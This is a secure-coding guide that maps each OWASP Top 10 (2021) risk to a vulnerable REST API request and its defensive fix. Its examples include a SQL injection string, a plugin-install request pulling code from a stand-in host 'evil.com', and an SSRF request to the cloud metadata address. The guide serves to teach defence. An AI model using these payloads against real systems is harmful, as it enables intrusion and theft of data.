# OWASP Top 10 → REST API Mapping

This document summarizes the OWASP Top 10 (2021) and maps each category to **practical REST API examples**, including vulnerable patterns and secure design approaches.

---

## OWASP Top 10 Overview

The OWASP Top 10 represents the most critical security risks to modern web applications and APIs.

---

## A01: Broken Access Control

### Vulnerable REST API Example

```http
GET /api/users/99999
Authorization: Bearer USER_TOKEN
```

**Issue**: User can access resources they do not own by manipulating IDs.

### Secure Design

* Enforce server-side authorization checks
* Deny access by default

```python
if request.user.id != resource.owner_id:
    return 403
```

---

## A02: Cryptographic Failures

### Vulnerable REST API Example

* Plaintext passwords
* No HTTPS

```http
POST /api/login
{
  "username": "bob",
  "password": "password123"
}
```

### Secure Design

* Enforce HTTPS
* Hash passwords using bcrypt / Argon2
* Encrypt sensitive data

---

## A03: Injection

### Vulnerable REST API Example

```http
GET /api/search?name=' OR '1'='1
```

```sql
SELECT * FROM users WHERE name = '$name'
```

### Secure Design

* Parameterized queries
* Input validation

```sql
SELECT * FROM users WHERE name = ?
```

---

## A04: Insecure Design

### Vulnerable REST API Example

* Unlimited login attempts
* No MFA
* No rate limiting

### Secure Design

* Threat modeling
* Rate limiting
* Account lockout
* MFA

---

## A05: Security Misconfiguration

### Vulnerable REST API Example

```http
GET /api/debug
```

```json
{
  "db_password": "admin123",
  "stacktrace": "..."
}
```

### Secure Design

* Disable debug endpoints in production
* Harden default configurations

---

## A06: Vulnerable and Outdated Components

### Vulnerable REST API Example

* Old libraries with known CVEs
* Unpatched dependencies

### Secure Design

* Dependency scanning
* Regular patching
* Remove unused libraries

---

## A07: Identification and Authentication Failures

### Vulnerable REST API Example

* Weak passwords
* Long-lived JWTs
* No logout invalidation

### Secure Design

* Short-lived access tokens
* Refresh tokens
* MFA

---

## A08: Software and Data Integrity Failures

### Vulnerable REST API Example

```http
POST /api/plugins/install
{
  "url": "http://evil.com/plugin.zip"
}
```

### Secure Design

* Signed plugins
* Trusted repositories only
* Secure CI/CD pipelines

---

## A09: Security Logging and Monitoring Failures

### Vulnerable REST API Example

* No logging
* No alerts
* Attacks go unnoticed

### Secure Design

* Centralized logging
* Alerting on suspicious activity
* Incident response plan

---

## A10: Server-Side Request Forgery (SSRF)

### Vulnerable REST API Example

```http
POST /api/fetch
{
  "url": "http://169.254.169.254/latest/meta-data/"
}
```

### Secure Design

* URL allow-lists
* Block internal IP ranges
* Network egress controls

---

## Summary Table

| OWASP ID | REST API Risk                        |
| -------- | ------------------------------------ |
| A01      | Unauthorized resource access         |
| A02      | Weak encryption / plaintext secrets  |
| A03      | Injection via parameters             |
| A04      | Poor security design                 |
| A05      | Insecure defaults / debug exposure   |
| A06      | Vulnerable dependencies              |
| A07      | Broken auth & session handling       |
| A08      | Unsigned code / supply chain attacks |
| A09      | Missing logs & alerts                |
| A10      | SSRF abuse                           |

---

## Key Takeaway

Modern REST APIs must be designed with **security by default**, covering access control, authentication, encryption, dependency management, and monitoring.
